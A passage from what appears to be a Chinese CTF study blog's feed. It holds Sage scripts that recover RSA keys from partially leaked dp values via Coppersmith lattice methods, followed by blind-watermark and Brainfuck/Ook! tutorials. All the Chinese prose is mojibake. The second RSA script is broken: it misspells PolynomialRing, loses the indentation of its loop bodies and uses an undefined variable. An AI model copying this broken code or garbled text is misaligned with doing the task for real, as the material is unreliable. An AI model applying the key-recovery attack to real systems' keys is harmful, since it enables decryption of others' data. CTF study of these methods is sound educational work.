itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br>    B = B.dense_matrix().LLL()<br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br>    <span class="hljs-keyword">return</span> []<br><br>n = <br>c = <br>e = <br><span class="hljs-comment">#hint=dp &gt;&gt; kbits</span><br>hint = <br>kbits = <br>leak = hint &lt;&lt; kbits<br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f = e * (leak + x) + (y - <span class="hljs-number">1</span>)<br>res = small_roots(f,(<span class="hljs-number">2</span>^kbits,<span class="hljs-number">2</span>^kbits),m=<span class="hljs-number">1</span>,d=<span class="hljs-number">4</span>)   <span class="hljs-comment">#æ±‚ä¸å‡ºæ—¶è°ƒæ•´mï¼Œdçš„å‚æ•°å€¼</span><br><span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(root)<br>    dp_low = root[<span class="hljs-number">0</span>]<br>    dp = leak + dp_low<br>    tmp = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e*dp,n) - <span class="hljs-number">2</span><br>    p = gmpy2.gcd(tmp,n)<br>    q = n // p<br>    d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>2.$e$è¾ƒå°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>dp0 = <br>e = <br>n = <br>kbits = <br><br>P.&lt;x&gt; = PolynoimalRing(Zmod(n))<br>tmp = inverse(e,n)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>f = dp0 &lt;&lt; kbits + x + tmp * (k - <span class="hljs-number">1</span>)<br>root = small_roots(X = <span class="hljs-number">2</span>^kbits,beta = <span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> root:<br>dp = dp0 &lt;&lt; kbits + root<br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br><span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>Â  Â  Â  Â  p_us = x//i +<span class="hljs-number">1</span><br>Â  Â  Â  Â  <span class="hljs-keyword">if</span> n % p_us == <span class="hljs-number">0</span>:<br>Â  Â  Â  Â  Â  Â  p = p_us<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> p&lt;<span class="hljs-number">0</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-comment">#print(p)</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong> <a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">RSA | Lazzaro</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-ç›²æ°´å°</title>
    <link href="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
    <url>/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>é€šå¸¸æ˜¯ä¸¤å¼ çœ‹èµ·æ¥ç›¸åŒçš„å›¾ç‰‡ï¼Œ<br>ç›®å‰æˆ‘æ‰€çŸ¥çš„å¯¹ä¸¤å¼ ç›¸åŒå›¾ç‰‡çš„å¤„ç†æ–¹å¼åªæœ‰ä¸¤ç§ï¼š</p><ul><li><strong>å¯¹åƒç´ å€¼è¿›è¡Œè¿ç®—ï¼š</strong> ä½¿ç”¨<code>stegsolve</code>çš„<code>image combiner</code>å¯¹ä¸¤å¼ å›¾ç‰‡åƒç´ å€¼è¿›è¡Œå¼‚æˆ–ï¼ŒåŠ å‡ç­‰ã€‚</li><li><strong>ç›²æ°´å°ï¼š</strong> ä½¿ç”¨<code>bwmforpy3.py</code>è„šæœ¬è¿›è¡Œæ“ä½œã€‚æ¥ä¸‹æ¥ä¼šä»‹ç»è¿™ç§æ–¹æ³•ã€‚</li></ul><h2 id="é¡¹ç›®è„šæœ¬"><a href="#é¡¹ç›®è„šæœ¬" class="headerlink" title="é¡¹ç›®è„šæœ¬"></a>é¡¹ç›®è„šæœ¬</h2><p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a><br>ä¸‹è½½å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/chishaxie/BlindWaterMark.git<br></code></pre></td></tr></table></figure><p>å…ˆå®‰è£…<code>opencv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install opencv-python<br></code></pre></td></tr></table></figure><p>å‡çº§pip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install --upgrade pip setuptools wheel<br></code></pre></td></tr></table></figure><p>å®‰è£…matplotlib</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install matplotlib<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bwmforpy3.py decode 1.png 2.png flag.png<br></code></pre></td></tr></table></figure><blockquote><p><strong>æ±‚åŠ©</strong>ï¼šè¿™é‡Œæœ‰ä¸ªé—ç•™é—®é¢˜ï¼Œä½¿ç”¨<code>--oldseed</code>æ¥å…¼å®¹python2è„šæœ¬randomç®—æ³•æ—¶ä¼šæŠ›å‡ºé”™è¯¯<code>Random.shuffle() got an unexpected keyword argument &#39;random&#39;</code>ã€‚æœ‰å¤§ä½¬çŸ¥é“æ€ä¹ˆå›äº‹å¯ä»¥å‘Šè¯‰æˆ‘ã€‚ã€‚</p></blockquote><h3 id="Python2ç‰ˆæœ¬"><a href="#Python2ç‰ˆæœ¬" class="headerlink" title="Python2ç‰ˆæœ¬"></a>Python2ç‰ˆæœ¬</h3><p><strong>ç®€è¦ï¼š</strong><br>è¿™é‡Œä½¿ç”¨minicondaæ¥é…ç½®python2.7ç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda install opencv<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 bwm.py decode 00000000.png 00000232.png flag.png<br></code></pre></td></tr></table></figure><h2 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h2><p>æœ‰æ—¶å€™ä¹Ÿå¯ä»¥ç”¨ä¸€æ¬¾åä¸º<code>WaterMark</code>çš„å·¥å…·ï¼ŒåŒ…æ‹¬æ–‡å­—æ°´å°å’Œå›¾ç‰‡æ°´å°ã€‚<br>è®ºå›é“¾æ¥<a href="https://www.52pojie.cn/thread-1980917-1-1.html">ç›²æ°´å°å·¥å…·WaterMark.exe - å¾çˆ±ç ´è§£ - 52pojie.cn</a><br><img src="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E7%9B%B2%E6%B0%B4%E5%8D%B0/file-20250405202453394.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-Brainfuck</title>
    <link href="/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-Brainfuck&amp;Ook!/"/>
    <url>/2025/04/05/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-Brainfuck&amp;Ook!/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æˆ‘ä»¬æ¥å­¦ä¹ ä¸€ä¸‹Brainfuckè¯­è¨€ä»¥åŠOok!è¯­è¨€ï¼Œå®ƒä»¬æ˜¯MISCä¸­çš„åŸºç¡€çŸ¥è¯†ï¼Œä¸€èˆ¬ä¼šå‡ºåœ¨ç­¾åˆ°é¢˜ã€‚</p><h1 id="BrainFuck"><a href="#BrainFuck" class="headerlink" title="BrainFuck"></a>BrainFuck</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>Brainfuckæ˜¯<strong>æœ€å°</strong>çš„ï¼Œ<strong>å›¾çµå®Œå¤‡</strong>çš„è¯­è¨€ã€‚</p><blockquote><p><strong>å›¾çµå®Œå¤‡</strong>å¯ä»¥ç®€å•ç†è§£ä¸ºä»»ä½•å¯ç”¨ç®—æ³•è§£å†³çš„é—®é¢˜ï¼Œéƒ½å¯ç”¨è¿™ä¸ªç¼–ç¨‹è¯­è¨€å»è§£å†³ã€‚</p></blockquote><p><strong>ç»“æ„ï¼š</strong> Brainfuckæ˜¯ç”±ä¸€ä¸ª<strong>æŒ‡é’ˆ</strong>å’Œä¸€ä¸ª<strong>æ•°ç»„</strong>ç»„æˆï¼Œå¦‚ä¸‹</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">æŒ‡é’ˆï¼š    â†“<br>æ•°ç»„ï¼š0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<br></code></pre></td></tr></table></figure><p><strong>ç»„æˆï¼š</strong> å®ƒåªç”±<strong>8ç§</strong>å­—ç¬¦ç»„æˆ</p><ul><li><code>&gt;</code>: æŒ‡é’ˆå‘å³ç§»åŠ¨ä¸€æ ¼ã€‚</li><li><code>&lt;</code>: æŒ‡é’ˆå‘å·¦ç§»åŠ¨ä¸€æ ¼ã€‚</li><li><code>+</code>: ä½¿æŒ‡é’ˆå½“å‰æ ¼çš„å­—èŠ‚æ•°åŠ 1ã€‚</li><li><code>-</code>: ä½¿æŒ‡é’ˆå½“å‰æ ¼çš„å­—èŠ‚æ•°å‡1.</li><li><code>.</code>: æŠŠå½“å‰æ ¼æ•°æŒ‰ASCIIè¡¨è¾“å‡ºåˆ°ç»ˆç«¯ã€‚</li><li><code>,</code>: æ¥æ”¶ä¸€ä¸ªå­—èŠ‚çš„è¾“å…¥ï¼Œå°†å…¶å€¼å­˜å‚¨åœ¨æ•°æ®æŒ‡é’ˆçš„å­—èŠ‚ä¸­ã€‚</li><li><code>[</code>: å½“å‰å€¼ä¸º0æ—¶ï¼Œç¨‹åºè·³è½¬è‡³ä¸ä¹‹å¯¹åº”çš„<code>]</code>ä¹‹åï¼›å¦åˆ™ç¨‹åºæ­£å¸¸æ‰§è¡Œã€‚</li><li><code>]</code>: ç¨‹åºè·³è½¬å›ä¸ä¹‹å¯¹åº”çš„<code>[</code>å¤„ã€‚</li></ul><h2 id="ç¼–ç¨‹å®ç°"><a href="#ç¼–ç¨‹å®ç°" class="headerlink" title="ç¼–ç¨‹å®ç°"></a>ç¼–ç¨‹å®ç°</h2><h3 id="1-è¡¨ç¤ºå­—æ¯â€™Aâ€™"><a href="#1-è¡¨ç¤ºå­—æ¯â€™Aâ€™" class="headerlink" title="1.è¡¨ç¤ºå­—æ¯â€™Aâ€™"></a>1.è¡¨ç¤ºå­—æ¯â€™Aâ€™</h3><p>å·²çŸ¥Açš„ASCIIå¯¹åº”å€¼ä¸º65ï¼Œæƒ³å¿…ä½ ä¸€å®šä¼šæƒ³åˆ°ä¸‹é¢çš„è¡¨ç¤ºæ–¹æ³•ï¼š</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶æœ‰ç‚¹è ¢ï¼Œä½†ä¸å¤±ä¸ºä¸€ç§æ–¹æ³•ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å­¦ä¹ æ”¹è¿›åçš„æ–¹æ³•ã€‚</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++</span><br><span class="hljs-title">[</span><br>&gt;<span class="hljs-literal">+++++++++++++</span><br>&lt;<span class="hljs-literal">-</span><br><span class="hljs-title">]</span><br>&gt;<span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥åˆ†æè¿™æ®µä»£ç ï¼Œå‡è®¾æŒ‡é’ˆæœ€å¼€å§‹æŒ‡å‘æ•°ç»„<code>a[0]</code>ï¼Œ<br>ç¬¬ä¸€è¡Œï¼Œè¿›è¡Œ<code>+++++</code>è¯´æ˜ï¼Œ<code>a[0]=5</code>ï¼›<br>ç¬¬äºŒè¡Œï¼Œå½“å‰æŒ‡é’ˆæŒ‡å‘<code>a[0]</code>ï¼Œä¸ç­‰äº0ï¼Œå› æ­¤è¿›å…¥å¾ªç¯ï¼›<br>ç¬¬ä¸‰è¡Œï¼Œ<code>&gt;</code>æŒ‡é’ˆå³ç§»ä¸€ä½ï¼ŒæŒ‡å‘<code>a[1]</code>ï¼Œæ¥ç€13ä¸ª<code>+</code>ï¼Œå³<code>a[1]=a[1]+13</code>ï¼›<br>ç¬¬å››è¡Œï¼Œ<code>&lt;</code>æŒ‡é’ˆå·¦ç§»ï¼Œå†æ¬¡æŒ‡å‘<code>a[0]</code>ï¼Œæ¥ç€<code>-</code>ï¼Œå³<code>a[0]=a[0]-1; ç¬¬äº”è¡Œï¼Œè¿”å›</code>[<code>; ç¬¬å…­è¡Œï¼Œ</code>&gt;<code>å³ç§»æŒ‡å‘</code>a[1]<code>ï¼Œ</code>.<code>è¾“å‡º</code>a[1]&#96;;</p><p>å¯ä»¥è½¬æ¢ä¸ºCè¯­è¨€è„šæœ¬æ¥ç†è§£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a[<span class="hljs-number">2</span>];<br>a[<span class="hljs-number">0</span>]=<span class="hljs-number">5</span>;<br>a[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(;a[<span class="hljs-number">0</span>]&gt;<span class="hljs-number">0</span>;a[<span class="hljs-number">0</span>]--)<br>&#123;<br>a[<span class="hljs-number">1</span>]+=<span class="hljs-number">13</span>;<br>&#125;<br><span class="hljs-comment">//è¿™é‡Œè¾“å‡ºASCIIçš„å€¼ï¼Œæ²¡æœ‰è¾“å‡ºå¯¹åº”å­—ç¬¦ï¼Œå®é™…åº”è¯¥è¾“å‡ºå­—ç¬¦ã€‚</span><br>print(a[<span class="hljs-number">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®ç°è¾“å‡ºâ€™Hello-MISCâ€™"><a href="#å®ç°è¾“å‡ºâ€™Hello-MISCâ€™" class="headerlink" title="å®ç°è¾“å‡ºâ€™Hello MISCâ€™"></a>å®ç°è¾“å‡ºâ€™Hello MISCâ€™</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°å¯¹åº”çš„ASCIIå€¼ï¼š</p><ul><li><code>H</code>: 72</li><li><code>e</code>: 101</li><li><code>l</code>: 108</li><li><code>o</code>: 111</li><li><code>ç©ºæ ¼</code> : 32</li><li><code>M</code>: 77</li><li><code>I</code>: 73</li><li><code>S</code>: 83</li><li><code>C</code>: 67<br>è„šæœ¬å®ç°å¦‚ä¸‹:</li></ul><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span>&gt;<span class="hljs-literal">+++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">+++</span>&gt;<span class="hljs-literal">+++++++</span>&gt;<span class="hljs-literal">+++++++</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span><br>&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span><span class="hljs-literal">++++++++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">---</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œä½ å·²ç»æŒæ¡äº†Brainfuckçš„ç¼–ç¨‹æ–¹æ³•ï¼Œå‡†å¤‡å¼€å¯ä½ çš„ç­¾åˆ°ä¹‹æ—…å§ï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://cloud.tencent.com/developer/article/2147388">ä¸€é—¨èƒ½è®©ä½ äº”åˆ†é’Ÿå­¦ä¼šçš„è¯­è¨€-Brainfuck-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><h1 id="Ookï¼"><a href="#Ookï¼" class="headerlink" title="Ookï¼"></a>Ookï¼</h1><h2 id="ä»‹ç»ï¼ˆä¸€æœ¬æ­£ç»ï¼‰"><a href="#ä»‹ç»ï¼ˆä¸€æœ¬æ­£ç»ï¼‰" class="headerlink" title="ä»‹ç»ï¼ˆä¸€æœ¬æ­£ç»ï¼‰"></a>ä»‹ç»ï¼ˆä¸€æœ¬æ­£ç»ï¼‰</h2><p>Ookï¼æ˜¯ä¸€ç§åŸºäºBrainfuckçš„å˜ç§ï¼Œæ„åœ¨è®©ç±»äººçŒ¿èƒ½å¤Ÿç†è§£å’Œä½¿ç”¨ï¼Œæˆä¸ºé«˜çº§ç¨‹åºçŒ¿ï¼ˆbushi</p><h2 id="ä»‹ç»ï¼ˆç©ç¬‘ï¼‰"><a href="#ä»‹ç»ï¼ˆç©ç¬‘ï¼‰" class="headerlink" title="ä»‹ç»ï¼ˆç©ç¬‘ï¼‰"></a>ä»‹ç»ï¼ˆç©ç¬‘ï¼‰</h2><p>Ookï¼çš„è¯­æ³•èƒ½å¤Ÿä¸Brainfuckä¸€ä¸€å¯¹åº”ï¼Œå› æ­¤ä¸Šè¾¹çš„å­¦ä¼šä¹‹åï¼Œä¸‹è¾¹ä¹Ÿä¸æˆé—®é¢˜ã€‚</p><table><thead><tr><th align="center">Brainfuck</th><th align="center">Ook!</th><th align="center">Short Ook!</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">Ook. Ook?</td><td align="center">. ?</td></tr><tr><td align="center">&lt;</td><td align="center">Ook? Ook.</td><td align="center">? .</td></tr><tr><td align="center">+</td><td align="center">Ook. Ook.</td><td align="center">. .</td></tr><tr><td align="center">-</td><td align="center">Ook! Ook!</td><td align="center">! !</td></tr><tr><td align="center">.</td><td align="center">Ook! Ook.</td><td align="center">! .</td></tr><tr><td align="center">,</td><td align="center">Ook. Ook!</td><td align="center">. !</td></tr><tr><td align="center">[</td><td align="center">Ook! Ook?</td><td align="center">! ?</td></tr><tr><td align="center">]</td><td align="center">Ook? Ook!</td><td align="center">? !</td></tr></tbody></table><p>ä¸Šæ–‡ä¸­çš„<code>Hello MISC</code>ï¼Œæ¢æˆOok!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Ook!">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. <br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§è¡¨ç¤º<code>short Ook!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Ook!">. . . . . . . . . . . . . . . . ! ? ! ! . ? . . . . . . . . . . . . . . . . ? . ? ! . ? . . . . . . . . . . . . . . . . ! . ? . . . . . . . . . . . ! ? ! ! . ? . . . . . . . . . . ? . ? ! . ? . . . . . . . . ! . . . . . . . . . . . . . . . ! . ! . . . . . . . ! . ? . . . . . . . . . . . . . . . . . ! ? ! ! . ? ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ? . ? ! . ? ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! . ? . . . . . . . . . . . . . ! ? ! ! . ? . . . . . . . . . . . . ? . ? ! . ? . . . . . . . . . . . . . . . . . . ! . ! ! ! ! ! ! ! ! ! . ? . . . . . . . ! ? ! ! . ? . . . . . . ? . ? ! . ? . . ! . ? . . . . . . . . . ! ? ! ! . ? ! ! ! ! ! ! ! ! ? . ? ! . ? ! . ? .<br></code></pre></td></tr></table></figure><h2 id="è¿è¡Œç¯å¢ƒ"><a href="#è¿è¡Œç¯å¢ƒ" class="headerlink" title="è¿è¡Œç¯å¢ƒ"></a>è¿è¡Œç¯å¢ƒ</h2><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaç®€å•é¡¹ç›®å®ç°</title>
    <link href="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    
